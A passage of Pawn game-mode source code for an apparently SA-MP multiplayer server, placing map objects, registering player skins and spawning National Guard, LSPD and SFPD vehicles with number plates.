	CreateDynamicObject(9131, 1451.800049, -1021.400024, 30.600000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1451.800049, -1021.400024, 32.599998, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1448.099976, -1021.400024, 25.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1448.099976, -1021.400024, 23.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1448.099976, -1021.400024, 27.400000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1448.099976, -1021.400024, 29.600000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1444.199951, -1021.500000, 25.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1444.199951, -1021.500000, 27.400000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1444.199951, -1021.500000, 23.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1444.199951, -1021.500000, 29.600000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1440.199951, -1021.500000, 25.299999, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1440.199951, -1021.500000, 27.500000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1440.199951, -1021.500000, 23.100000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1440.199951, -1021.500000, 29.700001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1436.500000, -1021.400024, 25.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1436.500000, -1021.400024, 23.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1436.500000, -1021.400024, 27.400000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1436.500000, -1021.400024, 29.600000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1432.199951, -1021.400024, 25.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1432.199951, -1021.400024, 27.400000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1432.199951, -1021.400024, 23.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1432.199951, -1021.400024, 29.600000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(16760, 1473.300049, -1019.599976, 40.099998, 0.000000, 0.000000, 89.000000);
	CreateDynamicObject(19425, 1492.779053, -1031.572632, 22.629000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(19425, 1492.835938, -1036.393677, 22.629000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(19425, 1470.838135, -1031.366089, 22.650400, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(19425, 1470.753296, -1036.245117, 22.650400, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(19425, 1484.529175, -1044.504883, 22.650551, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(19425, 1479.598755, -1044.510376, 22.650551, 0.000000, 0.000000, 0.000000);
// Tree Light

Balsys1 = CreateObject(19338,303.965179,-1901.703857,0.574748,0.000000,0.000000,0.000000);
//Balsys2 = CreateObject(19338,295.901000,-1900.918579,0.536103,0.000000,0.000000,0.000000);
//Balsys3 = CreateObject(19338,283.886016,-1899.791870,0.468552,0.000000,0.000000,0.000000);
Balsys2 = CreateObject(19338,271.637725,-1897.869995,0.361719,0.000000,0.000000,0.000000);
//Balsys5 = CreateObject(19338,262.903656,-1893.894287,0.673158,0.000000,0.000000,0.000000);
//Balsys6 = CreateObject(19338,252.438735,-1891.106689,0.671857,0.000000,0.000000,0.000000);
	//d
	// Sprays
	CreateObject(971, 1023.78613, -1029.41455, 31.54673,   0.00000, 0.00000, 0.00000);
	CreateObject(971, 719.89923, -462.54150, 15.36874,   0.00000, 0.00000, 0.00000);
	CreateObject(971, 488.50983, -1735.14417, 10.85964,   -4.80000, -90.47999, -6.00000);
	CreateObject(971, -1904.49500, 277.81223, 42.59598,   0.00000, 0.00000, 0.00000);
	CreateObject(971, -2425.55151, 1028.18726, 51.75891,   0.00000, 0.00000, 0.00000);
	CreateObject(971, 2071.54395, -1831.70972, 12.95858,   0.00000, 0.00000, -89.69999);
    //=--------------------------------------------------------------------------------------------------------=/
    AddPlayerClass(1,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(2,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(3,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(4,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(5,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(6,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(7,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(9,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(10,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(11,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(12,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(13,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(14,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(15,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(16,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(17,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(18,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(19,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(20,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(21,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(22,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(23,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(24,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(25,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(26,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(27,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(28,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(29,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(30,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(31,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(32,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(33,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(34,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(35,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(36,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(37,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(38,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(39,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(40,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(41,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(43,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(44,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(45,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(47,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(48,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(49,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(51,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(52,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(53,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(54,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(57,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(58,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(66,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(67,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(68,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(69,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(72,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(73,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(76,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(77,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(78,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(79,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(80,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(81,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(82,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(83,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(84,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(88,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(91,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(94,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(95,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(96,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(97,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(128,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(129,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(130,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(132,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(133,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(134,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(135,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(136,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(137,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(142,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(143,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(144,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(155,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(156,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(157,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(158,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(159,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(160,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(161,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(162,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(167,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(168,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(170,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(176,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(177,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(179,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(180,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(181,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(182,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(183,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(184,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(189,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(191,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(193,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(196,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(197,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(198,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(200,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(201,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(202,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(209,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(210,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(212,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(215,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(220,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(221,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(222,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(224,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(229,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(230,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(231,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(232,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(234,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(235,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(236,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(239,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(241,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(242,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(254,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(258,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(260,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(262,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(264,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(273,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(293,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(297,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    AddPlayerClass(299,1180.3374,-1181.2975,90.8448,0.0,0,0,0,0,0,0);
    //

    // CreatedCars check
    for(new i = 0; i < sizeof(CreatedCars); i++)
    {
        CreatedCars[i] = 0;
    }
//------------------------------------------------------------------------------[National Guard]
    NGVeh[0] = AddStaticVehicleEx(425,201.58865356,1889.67016602,18.49905777,0.00000000,-1,-1,900); SetVehicleNumberPlate(NGVeh[0], "NG 001");
    NGVeh[1] = AddStaticVehicleEx(425,225.55419922,1888.40429688,18.49905777,0.00000000,-1,-1,900); SetVehicleNumberPlate(NGVeh[1], "NG 002");
    NGVeh[2] = AddStaticVehicleEx(470,220.19429016,1916.51953125,17.75063705,180.00000000,-1,-1,900); SetVehicleNumberPlate(NGVeh[2], "NG 003");
    NGVeh[3] = AddStaticVehicleEx(470,202.64733887,1916.58215332,17.75063705,180.00000000,-1,-1,900); SetVehicleNumberPlate(NGVeh[3], "NG 004");
    NGVeh[4] = AddStaticVehicleEx(470,142.87440491,1932.31274414,19.34546089,177.99993896,-1,-1,900); SetVehicleNumberPlate(NGVeh[4], "NG 005");
    NGVeh[5] = AddStaticVehicleEx(470,117.37454987,1889.83227539,18.42624000,0.00000000,-1,-1,900); SetVehicleNumberPlate(NGVeh[5], "NG 006");
    NGVeh[6] = AddStaticVehicleEx(470,118.77082062,1828.45202637,18.42620468,272.00000000,-1,-1,900); SetVehicleNumberPlate(NGVeh[6], "NG 007");
    NGVeh[7] = AddStaticVehicleEx(520,308.33303833,1812.12414551,18.56019974,181.99993896,-1,-1,900); SetVehicleNumberPlate(NGVeh[7], "NG 008");
    NGVeh[8] = AddStaticVehicleEx(520,307.62231445,1833.62060547,18.56019974,181.99951172,-1,-1,900); SetVehicleNumberPlate(NGVeh[8], "NG 009");
    NGVeh[9] = AddStaticVehicleEx(520,306.54922485,1857.09973145,18.56019974,181.99951172,-1,-1,900); SetVehicleNumberPlate(NGVeh[9], "NG 010");
    NGVeh[10] = AddStaticVehicleEx(425,307.88702393,2047.22192383,18.49162483,179.99993896,-1,-1,900); SetVehicleNumberPlate(NGVeh[10], "NG 011");
    NGVeh[11] = AddStaticVehicleEx(476,271.90625000,2018.24267578,18.21062469,272.00000000,-1,-1,900); SetVehicleNumberPlate(NGVeh[11], "NG 012");
    NGVeh[12] = AddStaticVehicleEx(476,271.92376709,2028.49218750,18.21062469,271.99951172,-1,-1,900); SetVehicleNumberPlate(NGVeh[12], "NG 013");
    NGVeh[13] = AddStaticVehicleEx(476,272.01632690,1956.70092773,18.21062469,271.99951172,-1,-1,900); SetVehicleNumberPlate(NGVeh[13], "NG 014");
    NGVeh[14] = AddStaticVehicleEx(476,272.09646606,1989.10717773,18.21062469,271.99951172,-1,-1,900); SetVehicleNumberPlate(NGVeh[14], "NG 015");
    NGVeh[15] = AddStaticVehicleEx(522,225.649093,1901.794067,17.212947,36.028671,0,1,1200); SetVehicleNumberPlate(NGVeh[15], "NG 016");
    NGVeh[16] = AddStaticVehicleEx(522,223.190429,1902.224853,17.210340,27.506626,0,1,1200); SetVehicleNumberPlate(NGVeh[16], "NG 017");
    NGVeh[17] = AddStaticVehicleEx(522,220.710098,1902.386230,17.193317,22.523292,0,1,1200); SetVehicleNumberPlate(NGVeh[17], "NG 018");
    NGVeh[18] = AddStaticVehicleEx(522,204.718811,1901.499877,17.202690,326.418609,0,1,1200); SetVehicleNumberPlate(NGVeh[18], "NG 019");
    NGVeh[19] = AddStaticVehicleEx(522,202.786834,1901.977539,17.209606,322.303497,0,1,1200); SetVehicleNumberPlate(NGVeh[19], "NG 020");
    NGVeh[20] = AddStaticVehicleEx(522,200.460754,1901.945922,17.202959,139.122512,0,1,1200); SetVehicleNumberPlate(NGVeh[20], "NG 021");
	NGVeh[21] = AddStaticVehicleEx(522,202.510650,1860.574707,12.701459,2.116963,0,1,1200); SetVehicleNumberPlate(NGVeh[21], "NG 022");
    NGVeh[22] = AddStaticVehicleEx(432,252.314041,1955.363769,17.651113,120.906326,0,1,1200); SetVehicleNumberPlate(NGVeh[22], "NG 023");
    NGVeh[23] = AddStaticVehicleEx(432,240.801116,1980.755249,17.671680,125.217636,0,1,1200); SetVehicleNumberPlate(NGVeh[23], "NG 024");
    NGVeh[24] = AddStaticVehicleEx(432,250.612991,1970.944335,17.662721,127.714645,0,1,1200); SetVehicleNumberPlate(NGVeh[24], "NG 025");
//------------------------------------------------------------------------------[LSPD]
    CopLSVeh[0] = AddStaticVehicleEx(596,1535.87634277,-1666.99902344,13.20281219,0.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[0], "LSPD 001");
    CopLSVeh[1] = AddStaticVehicleEx(596,1535.87597656,-1678.02929688,13.20281219,0.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[1], "LSPD 002");
    CopLSVeh[2] = AddStaticVehicleEx(523,1559.90002441,-1616.33459473,13.04319000,184.00000000,-1,-1,900); SetVehicleNumberPlate(CopLSVeh[2], "LSPD 003");
    CopLSVeh[3] = AddStaticVehicleEx(523,1557.25683594,-1616.33398438,13.04319000,183.99902344,-1,-1,900); SetVehicleNumberPlate(CopLSVeh[3], "LSPD 004");
    CopLSVeh[4] = AddStaticVehicleEx(523,1567.69995117,-1616.33459473,13.04319000,184.00000000,-1,-1,900); SetVehicleNumberPlate(CopLSVeh[4], "LSPD 005");
    CopLSVeh[5] = AddStaticVehicleEx(523,1562.67968750,-1616.33398438,13.04319000,183.99902344,-1,-1,900); SetVehicleNumberPlate(CopLSVeh[5], "LSPD 006");
    CopLSVeh[6] = AddStaticVehicleEx(523,1565.19921875,-1616.33398438,13.04319000,183.99902344,-1,-1,900); SetVehicleNumberPlate(CopLSVeh[6], "LSPD 007");
    CopLSVeh[7] = AddStaticVehicleEx(596,1604.35913086,-1615.85778809,13.32752323,90.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[7], "LSPD 008");
    CopLSVeh[8] = AddStaticVehicleEx(599,1585.50451660,-1667.61010742,6.27707338,270.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[8], "LSPD 009");
    CopLSVeh[9] = AddStaticVehicleEx(596,1601.30493164,-1691.87841797,5.71062469,90.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[9], "LSPD 010");
    CopLSVeh[10] = AddStaticVehicleEx(596,1583.47998047,-1710.84545898,6.21075153,0.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[10], "LSPD 011");
    CopLSVeh[11] = AddStaticVehicleEx(596,1558.97167969,-1710.34448242,6.13862514,0.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[11], "LSPD 012");
    CopLSVeh[12] = AddStaticVehicleEx(523,1560.24035645,-1694.89086914,5.55736876,177.99993896,-1,-1,900); SetVehicleNumberPlate(CopLSVeh[12], "LSPD 013");
    CopLSVeh[13] = AddStaticVehicleEx(523,1570.47985840,-1694.90087891,5.55736876,177.99499512,-1,-1,900); SetVehicleNumberPlate(CopLSVeh[13], "LSPD 014");
    CopLSVeh[14] = AddStaticVehicleEx(596,1528.81286621,-1683.77429199,5.71062469,270.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[14], "LSPD 015");
    CopLSVeh[15] = AddStaticVehicleEx(596,1545.01232910,-1663.06811523,5.71062469,90.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[15], "LSPD 016");
    CopLSVeh[16] = AddStaticVehicleEx(599,1574.41711426,-1711.34216309,6.27575159,0.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[16], "LSPD 017");
    CopLSVeh[17] = AddStaticVehicleEx(599,1545.29406738,-1667.96044922,6.27575159,90.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[17], "LSPD 018");
    CopLSVeh[18] = AddStaticVehicleEx(599,1595.40002441,-1711.31799316,6.27575159,0.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[18], "LSPD 019");
    CopLSVeh[19] = AddStaticVehicleEx(497,1563.43750000,-1654.00793457,28.66060638,90.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[19], "LSPD 020");
    CopLSVeh[20] = AddStaticVehicleEx(522,1548.105224,-1670.722778,13.566993,90.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[20], "LSPD 021");
    CopLSVeh[21] = AddStaticVehicleEx(522,1547.810058,-1680.226440,13.130352,90.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[21], "LSPD 022");
    CopLSVeh[22] = AddStaticVehicleEx(411,1538.93115234,-1645.21472168,5.82083368,180.00000000,1,1,900); SetVehicleNumberPlate(CopLSVeh[22], "LSPD 023");
    CopLSVeh[23] = AddStaticVehicleEx(411,1526.62475586,-1644.60534668,6.07562494,179.99993896,1,1,900); SetVehicleNumberPlate(CopLSVeh[23], "LSPD 024");
    CopLSVeh[24] = AddStaticVehicleEx(411,1545.14721680,-1654.73608398,6.21075153,90.00000000,1,1,900); SetVehicleNumberPlate(CopLSVeh[24], "LSPD 025");
    CopLSVeh[25] = AddStaticVehicleEx(601,1579.028930,-1608.371337,13.109787,184.00000000,0,0,900); SetVehicleNumberPlate(CopLSVeh[25], "LSPD 026");
    CopLSVeh[26] = AddStaticVehicleEx(601,1573.519897,-1608.593139,13.112455,184.00000000,0,0,900); SetVehicleNumberPlate(CopLSVeh[26], "LSPD 027");
    CopLSVeh[27] = AddStaticVehicleEx(427,1567.889038,-1608.015869,13.004886,184.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[27],"LSPD 028");
    CopLSVeh[28] = AddStaticVehicleEx(427,1562.788818,-1608.009399,13.009813,184.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[28],"LSPD 029");
    CopLSVeh[29] = AddStaticVehicleEx(522,1558.944702,-1609.061279,12.959441,184.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[29],"LSPD 030");
    CopLSVeh[30] = AddStaticVehicleEx(522,1556.598388,-1609.097900,12.958120,184.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[30],"LSPD 031");
    CopLSVeh[31] = AddStaticVehicleEx(522,1547.644042,-1608.811889,12.957967,184.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[31],"LSPD 032");
    CopLSVeh[32] = AddStaticVehicleEx(522,1545.633544,-1608.979858,12.946562,184.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[32],"LSPD 033");
    CopLSVeh[33] = AddStaticVehicleEx(522,1550.866333,-1609.016113,12.953775,184.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[33],"LSPD 034");
    CopLSVeh[34] = AddStaticVehicleEx(522,1553.164428,-1609.161010,12.946096,184.00000000,0,1,900); SetVehicleNumberPlate(CopLSVeh[34],"LSPD 035");
    CopLSVeh[35] = AddStaticVehicleEx(522,1545.887451,-1684.627807,5.463136,85.431350,0,1,900); SetVehicleNumberPlate(CopLSVeh[35],"LSPD 036");
    CopLSVeh[36] = AddStaticVehicleEx(522,1543.345947,-1680.210693,5.451705,85.431350,0,1,900); SetVehicleNumberPlate(CopLSVeh[36],"LSPD 037");
    CopLSVeh[37] = AddStaticVehicleEx(522,1543.778442,-1676.194213,5.463771,85.431350,0,1,900); SetVehicleNumberPlate(CopLSVeh[37],"LSPD 038");
    CopLSVeh[38] = AddStaticVehicleEx(522,1544.405883,-1672.049926,5.451929,85.431350,0,1,900); SetVehicleNumberPlate(CopLSVeh[38],"LSPD 039");
    //--------------------------------------------------------------------------SFPD
	CopSFVeh[0] = AddStaticVehicle(522,-1639.618408,669.786987,-5.670371,268.715637,0,1);//Vehid:870 Title:NRGSF
	CopSFVeh[1] = AddStaticVehicle(522,-1639.833129,674.185668,-5.669574,270.887878,0,1);//Vehid:872 Title:NRGSF
	CopSFVeh[2] = AddStaticVehicle(522,-1639.999389,678.407104,-5.679861,273.701568,0,1);//Vehid:871 Title:NRGSF
	CopSFVeh[3] = AddStaticVehicle(522,-1639.977172,682.455810,-5.667366,261.691772,0,1);//Vehid:874 Title:NRGSF
	CopSFVeh[4] = AddStaticVehicle(522,-1639.991333,686.447692,-5.679396,273.113311,0,1);//Vehid:873 Title:NRGSF
	CopSFVeh[5] = AddStaticVehicle(522,-1632.521240,692.770874,-5.673705,181.525802,0,1);//Vehid:878 Title:NRGSF
	CopSFVeh[6] = AddStaticVehicle(522,-1628.672973,692.658386,-5.681616,178.508483,0,1);//Vehid:875 Title:NRGSF
	CopSFVeh[7] = AddStaticVehicle(522,-1624.671630,692.697387,-5.673835,177.278503,0,1);//Vehid:876 Title:NRGSF
